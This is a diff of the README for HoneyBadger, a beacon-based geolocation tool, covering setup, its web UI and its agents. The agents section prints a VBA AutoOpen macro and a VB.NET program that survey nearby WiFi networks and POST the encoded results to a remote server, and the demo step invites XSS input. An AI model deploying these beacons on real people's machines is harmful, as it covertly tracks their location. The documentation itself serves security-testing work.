@@ -1,15 +1,14 @@
 
-Honey Badger: Red Edition
+HoneyBadger
 =========================
 
 Website
 -------
+<https://github.com/bkonsela/honeybadger>
 
-<https://github.com/prometheaninfosec/honeybadger-red>
 
 Description
 -----------
-
 Used to identify the physical location of a web user with a combination
 of geolocation techniques using a browser's share location feature, the
 visible WiFi networks, and the IP address.
@@ -17,242 +16,402 @@ visible WiFi networks, and the IP address.
 
 Updates
 -------
+What's new in HoneyBadger?
 
-Honeybadger Red Edition contains a number of fresh additions to the venerable frameowrk.  Chief among them being support for new agents, as well as new data collection strategies.
+* Updated to Python 3.x
+* API keys extracted as CLI arguments
+* New fallback geolocation APIs added (IPStack, IPInfo.io)
+* New utilities for automatic wireless surveying (Windows, Linux)
+* New beacon agents (VB.NET, VBA)
 
-* New Agents!
-* New Data Encodings!
-* New Swagger!
-* New .htaccess file!
-* New Dependencies!
-* New Network Profile Stealing Capabilities!
-
-More sure to be added soon!
 
 Install Location
 ----------------
+`/opt/honeybadgerv3/`
 
-`/var/www/adhd/honeybadger/`
 
 Usage
 -----
+In order to use the latest version of HoneyBadger, Python 3 must be installed, as well as python3-pip. These should both be installed on the ADHD image.
 
-Visit [http://127.0.0.1/honeybadger/demo.php](http://127.0.0.1/honeybadger/demo.php) to log your location.
+Install HoneyBadger's required packages with the following command:
+`pip3 install -r requirements.txt`
 
-Visit [http://127.0.0.1/honeybadger/index.php](http://127.0.0.1/honeybadger/index.php) to view the connection map.
+Next, initialize the database. To do so, navigate to the directory that contains the HoneyBadger files and run the Python interpreter:
+`cd /opt/honeybadgerv3/server`
+`python3`
 
-Video Walkthrough
------------------
+From the python interpreter, run the following:
 
-<iframe src="https://onedrive.live.com/embed?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155673&authkey=AM_U5oxKFN3Tc8k" width="320" height="180" frameborder="0" scrolling="no" allowfullscreen sandbox="allow-scripts allow-pointer-lock allow-forms allow-same-origin"></iframe>
+    import honeybadger
+    honeybadger.initdb('adhd', 'adhd')
 
-Example 1: Web Browser Share Location
--------------------------------------
+Quit the Python interpreter.
 
-Open the web browser and enter [http://127.0.0.1/honeybadger/demo.php](http://127.0.0.1/honeybadger/demo.php)
-into the address bar. This address is also available as a link by visiting [http://127.0.0.1/](http://127.0.0.1/)
-and clicking `Honey Badger (Location Tracker)`.
+Finally, from the same directory, run the HoneyBadger server:
+`python3 honeybadger.py -ik <IPSTACK_KEY> -gk <GOOGLE_KEY>`
 
-![](HoneyBadger_files/webkit_root.PNG)
+To view a help message, run the following:
+`python3 honeybadger.py -h`
 
-Honey Badger will then attempt to gather your location using a variety of
-techniques. First, it uses the web browser's built in location sharing
-functionality. The web browser will first prompt you whether or not to
-share your location with Honey Badger.
-Click "Share Location."
-
-![](HoneyBadger_files/share_location.PNG)
+NOTE: Though HoneyBadger will still run without API keys, functionality is severely limited without them.
 
 
-That's it. Honey Badger has now logged your location. Go to
-[Example 3: Viewing the Honey Badger Map] to find how to view the
-location Honey Badger gathered.
+Example 1: Overview
+-------------------
+The HoneyBadger UI has many features. This section will give a brief overview of HoneyBadger's pages.
 
-Example 2: Creating a Honey Badger User
----------------------------------------
+Navigate to the HoneyBadger server, and you will be presented with the following screen:
 
+![](HoneyBadger_files/hb_login.png)
 
-Before you can view the data Honey Badger has collected you will need to create a user.
-Creating a user in Honey Badger is super simple.
+Use the credentials set earlier to log in, and you will be brought to the map.
 
-Change into the Honey Badger admin directory
+To navigate to other pages of HoneyBadger, use the navigation bar in the top right corner:
 
-`~$` **`cd /var/www/adhd/honeybadger/admin`**
+![](HoneyBadger_files/hb_navbar.png)
 
-Now run create_user.py and follow the prompts to create a new administrative user.
-Make sure to sudo this next command!
+### 1. Map ###
+The map is the default landing page after logging in.
 
-NOTE: There is probably already a user by the name adhd as this is the default user for this distro.  You may want to create a user with a different name and password.  Or change this user's password by deleting it and recreating it with a new password.
+![](HoneyBadger_files/hb_map.png)
 
-`/var/www/adhd/honeybadger/admin$` **`sudo ./create_user.py`**
+The map is the main event of HoneyBadger in terms of presentation, and will pin a location when a beacon is triggered.
 
-        Username: adhd
-        Password: adhd
-        User Role Options:
-        0 - Administrator
-        1 - User
-        Role: 0
-        Salt: rWeKE
-        Hash: 6de86dd5a8a5e3309c1c9587d44a337b1cfd523d
-        [!] Database not initialized.
+### 2. Targets ###
+Navigate to the targets page.
 
-For this example I created a user named **adhd** with password **adhd**
-I also made this user an administrator.  Honey Badger administrators are given permissions to
-purge the database and logs from within the Honey Badger interface.
+![](HoneyBadger_files/hb_targets.png)
 
-Now that you have created a user, you are ready to proceed onto
-[Example 3: Viewing the Honey Badger Map].
+The targets page is where targets can be observed, added, or removed, The page also serves as a way to generate several agents that are not quickly generated manually.
 
+### 3. Beacons ###
+Navigate to the beacons page.
 
-Example 3: Viewing the Honey Badger Map
----------------------------------------
+![](HoneyBadger_files/hb_beacons.png)
 
-NOTE: Before you are able to view the honeybadger map you will need a Google Maps API key.  There is one that comes with Honeybadger-red.  HOWEVER, if you choose to get one for yourself: You can get an API key here: https://developers.google.com/maps/documentation/javascript/get-api-key  --> Simply put that key in the top of badger.php where it says $API="".
+The beacons page maintains a list of beacons that connect to HoneyBadger and successfully geolocate. Beacons can be removed from this page as well.
 
-Open the web browser and enter
-[http://127.0.0.1/honeybadger/badger.php](http://127.0.0.1/honeybadger/badger.php)
-into the address bar. This address is also available as a link by
-visiting [http://127.0.0.1/](http://127.0.0.1/) and clicking "Honey Badger (Reporting)."
+### 4. Log ###
+Navigate to the log page.
 
-Use your credentials on the login screen to authenticate.
+![](HoneyBadger_files/hb_log_empty.png)
 
-![](HoneyBadger_files/login_screen.PNG)
+The log page is populated with information as beacons attempt to connect to the HoneyBadger server, and may be empty if accessed before any beacons connect to the server.
 
-After you log in with the username and password we created in
-[Example 2: Creating a Honey Badger User] you will be taken to the reporting page.
+### 5. Profile ###
+Navigate to the profile page.
 
+![](HoneyBadger_files/hb_profile.png)
 
-![](HoneyBadger_files/viewing_default_target.PNG)
+The profile page allows for changing the password of the currently logged in account.
 
-The reporting page contains a map showing the locations that Honey Badger has logged.  You can select your target from the dropdown menu on the left.
+### 6. Admin ###
+Navigate to the admin page.
 
-Honey Badger keeps track of each connection and displays one at a time on the map. To choose a
-different connection than the one shown, click on the drop-down menu and select another entry.
+![](HoneyBadger_files/hb_admin.png)
 
-NOTE: Obviously there's not going to be anything there if you haven't logged any connection attemps yet.  Try using the techniques in the other examples to get some data logged. Then check back here.
+The admin page is where administrative actions can be performed on accounts, and where new accounts can be added.
 
-Example 4: Using Java to Find Nearby Wireless APs
--------------------------------------------------
+### 7. Logout ###
+Clicking logout on the navbar will log you out, bringing you back to the login page.
 
-NOTE: Support for Java Applets has been waning across the internet as of late.  If you can't get this technique to work, try some of the new agents below.
+![](HoneyBadger_files/hb_logout.png)
 
-What happens if you follow [Example 1: Web Browser Share Location], but you decide not
-to share your location?  Honey Badger has another way to discover your physical
-location if your machine has Java installed and an active wireless card.
-First, find the IP address of the ADHD machine. The assumption here is
-that you will be connecting to it from within a local network.
+NOTE: All pages containing a table of records can be sorted by clicking on the table headings.
 
-`$` **`ifconfig`**
-
-        eth0    Link encap:Ethernet  HWaddr 00:0c:29:6c:14:79
-                inet addr:192.168.1.137  Bcast:192.168.1.255  Mask:255.255.255.0
-                inet6 addr: fe80::20c:29ff:fe6c:1479/64 Scope:Link
-                UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-                RX packets:136005 errors:0 dropped:0 overruns:0 frame:0
-                TX packets:59528 errors:0 dropped:0 overruns:0 carrier:0
-                collisions:0 txqueuelen:1000
-                RX bytes:146777599 (146.7 MB)  TX bytes:7955605 (7.9 MB)
-                Interrupt:19 Base address:0x2000
-
-        lo      Link encap:Local Loopback
-                inet addr:127.0.0.1  Mask:255.0.0.0
-                inet6 addr: ::1/128 Scope:Host
-                UP LOOPBACK RUNNING  MTU:16436  Metric:1
-                RX packets:12930 errors:0 dropped:0 overruns:0 frame:0
-                TX packets:12930 errors:0 dropped:0 overruns:0 carrier:0
-                collisions:0 txqueuelen:0
-                RX bytes:3413486 (3.4 MB)  TX bytes:3413486 (3.4 MB)
-
-In this case the IP address for the machine is 192.168.1.137. Now, from
-another machine that has an active wireless card and Java installed,
-connect to <http://192.168.1.137/honeybadger/demo.php>.
-
-Honey Badger will attempt to gather your
-location using a variety of techniques. First, it uses the web browsers
-built in location sharing functionality. The web browser will
-prompt you whether or not to share your location with Honey Badger.
-Instead of accepting, click the 'x' to close the prompt so that the Java
-technique will run.
-
-![](HoneyBadger_files/image004.png)
-
-Honey Badger will then attempt to gather your location by means of a
-Java applet. After a short time you will be prompted whether you want to
-allow the applet to access the computer. Click "Allow."
-
-![](HoneyBadger_files/image005.png)
-
-Since the applet requires a high level of access to the local machine,
-Java first prompts the user to allow access.
-
-That's it. If successful, Honey Badger has now logged your location. Go
-to [Example 3: Viewing the Honey Badger Map] to find how to view the
-location Honey Badger gathered.
-
-Example 5: Red Edition Updates
-------------------------------
-
-A number of additions have been made to bring Honeybadger back to full fighting form.
-
-For starters there is now a .htaccess file.  As long as your site configuration allows htaccess overrides, everything you need to keep the honeybadger install safe should be set.  Honeybadger has a few security needs that have to be implemented at the level of the web service.  For example, you shouldn't be able to just download the database without authenticating and reading the data through the app.  An attacker could potentially do this if the web server is not configured to disallow it.  Those configurations can be made in Apache at the level of the virtual host, or in this case, with an htaccess file.
-
-You can test whether or not this is working by attempting to visit the a disallowed resource.  like [admin/vhost_config.txt](http://localhost/honeybadger/admin/vhost_config.txt) from your web browser.  If you see anything other than a 404 error, something is wrong.
-
-There are also some new agents.  You can check out the agents by navigating to the folder admin/agents from a console on your webserver.
-
-Honeybadger is now able to handle multiple types of encodings.  You can specify the encoding type that the agent will be using in the call to service.php using the parameter "decode" (current choices are base64 and hex).
-
-The new agents are also gaining new capabilities (pulling stored network profiles) more will be added in time.
-
-
-Example 6: Powershell Via HTA
+Example 2: Using the Map
 -----------------------------
+Navigate to the map page.
 
-Honeybadger now has a powershell based agent.  As of the latest updates there are also two stagers for the powershell agent, an HTA launcher, and a word macro.  Herre we'll discuss the HTA launcher.
+![](HoneyBadger_files/hb_map.png)
 
-But first, what is an HTA?  This rather obscure executable type is an "HTML Application"; which is described as a "Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages" (Wikipedia).  Simply put, it's a rare executable format.
+At its core, the map page uses the Google Maps API, and functions identically to the standard Google Maps.
 
-You'll find a link to download the HTA agent on Honeyadger's demo page.
+Several options are available for filtering map points by targets and by agents, using the map legend:
 
-![](HoneyBadger_files/demo_page.PNG)
+![](HoneyBadger_files/hb_map_legend.png)
 
-Assumedly, you'll be running Honeybadger on some type of Linux host.  The HTA format is an agent designed to target only Windows machines.  So you'll need to navigate to Honeybadger from a remote windows host.  The specifics of how this will be accomplished are entirely dependent on your particular setup.
+As targets are added or unique agents are used to beacon into a target, they will show up in this legend. Toggling checkboxes in the legend enables filtering of beacons that are displayed in the map.
 
-In general though, if the Honeybadger instance and Windows machine are on the same network, all you'll need to do is run **`ifconfig`** on the machine serving Honeybadger to grab it's IP.  Then navigate to <honeybadger_ip>/honeybadger/demo.php
+Points on the map can be clicked to display information about the machine that beaconed in:
 
-Then click "HTA Launcher" to download the HTA.
-
-NOTE: Depending on your web browser you might see different warning messages.  Click through all of them.
-
-![](HoneyBadger_files/run_hta.PNG)
-
-Click "Run" to launch the HTA.
-
-After a moment you should see a window like this pop up.
-
-![](HoneyBadger_files/hta_window.PNG)
-
-That's it.  Wait a few seconds and close the window.
-In the background, the HTA has downloaded and executed Honeybadger's powershell agent.  To view the gathered results, head over to [Example 3: Viewing the Honey Badger Map].
+![](HoneyBadger_files/hb_map_beacondetails.png)
 
 
-Example 7: Powershell Via Macro
+Example 3: Working with Targets
 -------------------------------
+Navigate to the targets page.
 
-Another option that the new Honeybadger has, is the ability to user a word doc macro to stage the powershell script.  Word macros allow the execution of code from within a word document.  In this case the macro embedded into the Honeybadger docm agent will connect back to the Honeybadger service, pull down and execute the powershell script that gathers location data and sends it once again, back to the service.
+![](HoneyBadger_files/hb_targets.png)
 
-To get the document, simply navigate as before (In example 6) to the demo page.
+Take a closer look at the information associated with the demo target:
 
-![](HoneyBadger_files/demo_page.PNG)
+![](HoneyBadger_files/hb_targets_targetinfo.png)
 
-This time, click "Doc File".  Your browser should download and open the document.
+Moving left to right:
 
-![](HoneyBadger_files/protected_docm_view.PNG)
+* id: list id number
+* name: name of the target
+* guid: unique id of the target
+* beacon_count: number of beacons associated with the target
+* action: available actions regarding the target
+    - macro: generate a VBA macro beacon for the target
+    - VB.NET: generate a VB.NET beacon for the target
+    - demo: navigate to the target's demo page
+    - delete: delete the target
 
-If word opens the document up in protected view, click "Enable Editing".
+Note that clicking on any of the first four table headings will sort the table based on that column in ascending or descending order, as indicated by an arrow that appears upon clicking.
 
-![](HoneyBadger_files/enable_docm_macros.PNG)
+To add a new target, enter the target name in the field at the top of the page, and click the add button.
 
-You may also need to click "Enable Content"; a deceptively benign button press.
+The new target will appear in the list:
 
-That's it.  You might notice a powershell window open on your taskbar, before fading away after a few seconds.  Your location has been transmitted back to the Honeybadger server.  To view the data use the process from [Example 3: Viewing the Honey Badger Map].
+![](HoneyBadger_files/hb_targets_targetadd.png)
+
+Two agents can be generated from this page, one for VBA Office macros and one for VB.NET.
+
+Clicking on the macro button will show the macro in a popup:
+
+![](HoneyBadger_files/hb_targets_targetVBA.png)
+
+Clicking on on the VB.NET button will show the VB.NET code in a popup:
+
+![](HoneyBadger_files/hb_targets_targetVBNET.png)
+
+NOTE: Though HoneyBadger attempts to copy the code to the clipboard, it's safest to simply copy the macro by hand.
+
+To delete a target, click the target's delete button. A prompt will appear:
+
+![](HoneyBadger_files/hb_targets_targetdelete.png)
+
+Click OK, and the target will be removed from the list.
+
+
+Example 4: Working with Beacons
+-------------------------------
+Navigate to the beacons page.
+
+![](HoneyBadger_files/hb_beacons.png)
+
+Take a closer look at the information associated with the first demo beacon:
+
+![](HoneyBadger_files/hb_beacons_beaconinfo.png)
+
+Moving left to right:
+
+* id: list id number
+* target: which target the beacon associated with
+* agent: the agent that the beacon used to communicate with the server
+* lat: geolocation latitude of the beacon
+* lng: geolocation longitude of the beacon
+* acc: geolocation accuracy of the beacon
+* ip: IP address of the beacon
+* created: timestamp of beacon creation
+* action: available action regarding the target
+    - delete: delete the beacon
+
+Using an agent, beacon into HoneyBadger, and refresh the beacons page to see a new beacon added to the list:
+
+![](HoneyBadger_files/hb_beacons_beaconadded.png)
+
+To delete a beacon, click the beacon's delete button. A prompt will appear:
+
+![](HoneyBadger_files/hb_beacons_beacondelete.png)
+
+Click OK, and the beacon will be removed from the list
+
+
+Example 5: Observing the Log
+----------------------------
+Navigate to the log page.
+
+![](HoneyBadger_files/hb_log.png)
+
+The log page has been populated with information after the beacon was added in Example 4. The log contains information pertaining to the beacon, and will contain information if a beacon is unable to geolocate.
+
+Example 6: Changing Profile Information
+---------------------------------------
+Navigate to the profile page.
+
+![](HoneyBadger_files/hb_profile.png)
+
+To change a password, fill in the fields accordingly. Note that passwords set with the profile page must meet minimum complexity requirements of a minimum of 10 characters, of which all four character classes (uppercase letters, lowercase letters, special characters, and numbers) must be used.
+
+If the password does not meet minimum complexity requirements, the password is rejected and the user is notified:
+
+![](HoneyBadger_files/hb_profile_badcomplexity.png)
+
+Upon successful password change, the user is notified:
+
+![](HoneyBadger_files/hb_profile_profileupdated.png)
+
+Example 7: Administration
+-------------------------
+Navigate to the admin page.
+
+![](HoneyBadger_files/hb_admin.png)
+
+Note that modification of the current user is not allowed. If this is attempted, the user is notified of this:
+
+![](HoneyBadger_files/hb_admin_selfmodify.png)
+
+To add a new user, enter an email address in the box above, and click initialize. The new user will appear in the list:
+
+![](HoneyBadger_files/hb_admin_useradded.png)
+
+To get an activation link to the user, click the get link button. The link will be copied to the clipboard.
+
+To delete a user, click the user's delete button. The following prompt will appear:
+
+![](HoneyBadger_files/hb_admin_userdelete.png)
+
+Click OK, and the user will be removed from the list:
+
+![](HoneyBadger_files/hb_admin_userdeleted.png)
+
+Example 8: Agents
+-----------------
+### 1. Demo Page ###
+Navigate to the targets page.
+
+![](HoneyBadger_files/hb_targets.png)
+
+Click on the demo button to be taken to the demo page:
+
+![](HoneyBadger_files/hb_demo.png)
+
+Enter some XSS code into the first field, and the current user's password into the second field, and click submit.
+
+If the inputted XSS code worked, the following string of popups will appear.
+
+![](HoneyBadger_files/hb_demo_locationrequest.png)
+
+Click on Share Location.
+
+![](HoneyBadger_files/hb_demo_consentprompt.png)
+
+Click OK.
+
+![](HoneyBadger_files/hb_demo_appletprompt.png)
+
+Click Allow Now.
+
+![](HoneyBadger_files/hb_demo_appletprompt_again.png)
+
+Click Run.
+
+![](HoneyBadger_files/hb_demo_appletsecurity.png)
+
+Click Yes.
+
+![](HoneyBadger_files/hb_demo_applethoney.png)
+
+Click Yes.
+
+![](HoneyBadger_files/hb_demo_applethoney_again.png)
+
+After clicking through all of the prompts, the page will load. Reload the HoneyBadger beacons page to see that a new beacon is added:
+![](HoneyBadger_files/hb_demo_jsbeacon.png)
+
+
+### 2. VBA Macro ###
+The VBA macro code are not included as comments in the generated popup for the sake of brevity. The VBA macro functionality is explained here. In short, the VBA macro imitates the powershell script.
+
+    Sub AutoOpen()
+        ' Create an instance of a WSH shell for system commands
+        Set objWSH = CreateObject("WScript.Shell")
+
+        ' Run the netsh command via powershell for automatic wireless survey
+        wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll
+        
+        ' Open a file handle to a temporary file and write netsh results to file
+        Open Environ("temp") & "\wifidat.txt" For Output As #1
+            Print #1, wifi
+        Close #1
+        
+        ' Read contents in from temp file, fixing encoding issues with the web request
+        wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
+
+        ' Remove the temporary file
+        Kill Environ("temp") & "\wifidat.txt"
+
+        ' Base64-encode the netsh data for sending.
+        wifienc = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+
+        ' Create a web object
+        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+        ' Open the connection via POST request to the HoneyBadger server
+        objHTTP.Open "POST", "http://<SERVER>:5000/api/beacon/aedc4c63-8d13-4a22-81c5-d52d32293867/VBA"
+
+        ' Set request headers to make the server aware of the POST form data
+        objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+
+        ' Send the properly formatted POST form to the server
+        objHTTP.Send "os=windows&data=" & wifienc
+    End Sub
+
+To use the macro code, simply open a document, paste this macro inside, and save as a .docm file. Upon opening and accepting to run code, the macro will be triggered and the beacon will be added.
+
+
+### 3. VB.NET Script ###
+The VB.NET code is identical in function and near identical in structure to the VBA macro. Changes needed to be made to make it a valid VB.NET script, for version difference issues between VB.NET and VBA. Like the macro, the VB.NET functionality is explained here:
+
+    Imports System.IO
+    
+    Module HoneyBadgerBeacon
+        Sub Main()
+            ' Create and initialize a new WSH shell object
+            Dim objWSH As New Object
+            objWSH = CreateObject("WScript.Shell")
+
+            ' Create and initialize the wifi data variable
+            Dim wifi As String
+            wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll
+            
+            ' Create a temp file
+            Dim objWriter As New System.IO.StreamWriter(Environ("temp") & "\wifidat.txt")
+            
+            ' Write data to file
+            objWriter.Write(wifi)
+
+            ' Close file
+            objWriter.Close(0)
+            
+            ' Read in the temp file contents with proper encoding
+            wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
+            
+            ' Delete temp file
+            Kill(Environ("temp") & "\wifidat.txt")
+
+            ' Base64-encode data
+            wifi = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF88.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+
+            ' Create new web object
+            Dim objHTTP As New Object
+            objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+            ' Open POST request to server
+            objHTTP.Open("POST", "http://<SERVER>:5000/api/beacon/aedc4c63-8d13-4a22-81c5-d52d32293867/VB")
+
+            ' Set request headers to notify server of POST form data
+            objHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+
+            ' Send the formatted data to the server
+            objHTTP.Send("os=windows&data=" & wifi)
+        End Sub
+    End Module
+
+Copy this script into a file with a .vb extension, and run vbc <FILENAME>.vb to compile, and then run <FILENAME>.exe to create the beacon.
+
+
+### 4. HTML ###
+To use a beacon with the HTML agent, go to the targets page and copy the GUID of the desired target, and create a URL formatted like so:
+`http://<SERVER>:5000/api/beacon/<GUID>/HTML?lat=<LAT>&lng=<LNG>&acc=<ACC>`
+
+Navigate to this page in a browser. The server will return a 404
+
+
+### 5. CMD ###
+The CMD agent is a type of HTML agent, as the beacon is created via web requests on the command line. There are two utilities in the util directory of HoneyBadger, one for windows and one for linux. They utilize Google's geolocation API. Usage information is available in those scripts. 
